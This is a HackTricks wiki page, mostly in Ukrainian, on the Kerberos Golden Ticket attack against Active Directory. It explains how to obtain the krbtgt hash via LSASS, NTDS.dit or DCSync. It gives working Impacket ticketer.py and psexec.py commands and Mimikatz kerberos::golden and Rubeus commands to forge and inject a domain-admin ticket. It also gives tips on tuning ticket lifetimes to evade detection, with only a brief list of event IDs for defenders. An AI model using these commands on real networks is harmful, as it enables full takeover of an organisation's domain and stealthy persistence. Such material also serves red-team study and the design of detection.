# Golden Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Golden ticket

Атака **Golden Ticket** полягає у **створенні легітимного квитка на отримання квитка (TGT), що імітує будь-якого користувача** за допомогою **NTLM хешу облікового запису krbtgt Active Directory (AD)**. Ця техніка є особливо вигідною, оскільки вона **дозволяє отримати доступ до будь-якої служби або машини** в межах домену як імітований користувач. Важливо пам'ятати, що **облікові дані облікового запису krbtgt ніколи не оновлюються автоматично**.

Щоб **отримати NTLM хеш** облікового запису krbtgt, можна використовувати різні методи. Його можна витягти з **процесу Local Security Authority Subsystem Service (LSASS)** або з **файлу NT Directory Services (NTDS.dit)**, розташованого на будь-якому контролері домену (DC) в межах домену. Крім того, **виконання атаки DCsync** є ще однією стратегією для отримання цього NTLM хешу, що може бути виконано за допомогою таких інструментів, як **модуль lsadump::dcsync** в Mimikatz або **скрипт secretsdump.py** від Impacket. Важливо підкреслити, що для виконання цих операцій зазвичай потрібні **права адміністратора домену або подібний рівень доступу**.

Хоча NTLM хеш служить життєздатним методом для цієї мети, **рекомендується** **підробляти квитки, використовуючи ключі Kerberos з розширеним шифруванням (AES) (AES128 та AES256)** з міркувань оперативної безпеки.


{% code title="From Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="З Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Якщо** ви маєте **впроваджений золотий квиток**, ви можете отримати доступ до спільних файлів **(C$)**, а також виконувати сервіси та WMI, тому ви можете використовувати **psexec** або **wmiexec** для отримання оболонки (схоже, що ви не можете отримати оболонку через winrm).

### Обхід поширених виявлень

Найпоширеніші способи виявлення золотого квитка - це **перевірка трафіку Kerberos** в мережі. За замовчуванням, Mimikatz **підписує TGT на 10 років**, що буде виглядати аномально в наступних запитах TGS, зроблених з ним.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Використовуйте параметри `/startoffset`, `/endin` та `/renewmax`, щоб контролювати початковий зсув, тривалість та максимальні поновлення (все в хвилинах).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
На жаль, тривалість життя TGT не реєструється в 4769, тому ви не знайдете цю інформацію в журналах подій Windows. Однак, що ви можете корелювати, це **бачити 4769 без попереднього 4768**. **Неможливо запитати TGS без TGT**, і якщо немає запису про виданий TGT, ми можемо зробити висновок, що він був підроблений офлайн.

Щоб **обійти цю перевірку виявлення**, перевірте діамантові квитки:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Пом'якшення

* 4624: Вхід в обліковий запис
* 4672: Вхід адміністратора
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Інші маленькі трюки, які можуть зробити захисники, це **попереджати про 4769 для чутливих користувачів**, таких як обліковий запис адміністратора домену за замовчуванням.

## Посилання
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{% hint style="success" %}
Вчіться та практикуйте Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вчіться та практикуйте Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте за нами в** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться трюками хакерів, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
